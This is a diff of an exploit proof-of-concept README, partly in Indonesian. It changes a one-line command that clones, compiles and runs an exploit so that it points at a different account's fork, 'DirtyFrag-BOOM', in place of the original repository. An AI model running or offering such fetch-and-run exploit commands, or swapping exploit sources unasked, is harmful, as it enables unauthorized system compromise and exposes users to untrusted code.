@@ -25,7 +25,7 @@ Untuk informasi teknis lengkap dan timeline, [lihat di sini](assets/write-up.md)
 ## One-line Special
 
 ```bash id="3k8mde"
-git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+git clone https://github.com/SFrian/DirtyFrag-BOOM.git && cd DirtyFrag-BOOM && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 ```
 
 PoC ini disediakan sebagai technical reference setelah konsultasi dengan linux-distros. Jangan gunakan pada sistem yang tidak memiliki izin untuk diuji.
